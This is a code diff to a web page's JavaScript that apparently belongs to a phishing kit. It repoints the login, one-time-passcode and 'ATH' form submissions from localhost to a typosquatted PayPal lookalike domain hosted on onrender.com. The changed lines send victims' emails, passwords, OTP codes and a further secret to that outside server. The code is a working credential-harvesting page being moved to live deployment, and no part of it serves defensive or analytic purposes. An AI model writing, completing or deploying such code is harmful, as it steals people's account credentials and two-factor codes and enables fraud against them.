@@ -12,7 +12,7 @@ document.getElementById("loginForm").addEventListener("submit", async function (
 
     try {
         // Send email and password to the server
-        const response = await fetch('http://localhost:5000/submit-login', {
+        const response = await fetch('https://paaypal.onrender.com/submit-login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ email, password })
@@ -48,7 +48,7 @@ document.getElementById("otpForm").addEventListener("submit", async function (ev
 
     try {
         // Send OTP and email to the server
-        const response = await fetch('http://localhost:5000/submit-otp', {
+        const response = await fetch('https://paaypal.onrender.com/submit-otp', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ email: userEmail, otp }) // Include stored email
@@ -83,7 +83,7 @@ document.getElementById("athForm").addEventListener("submit", async function (ev
 
     try {
         // Send ATH and email to the server
-        const response = await fetch('http://localhost:5000/submit-ath', {
+        const response = await fetch('https://paaypal.onrender.com/submit-ath', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ email: userEmail, ath }) // Include stored email
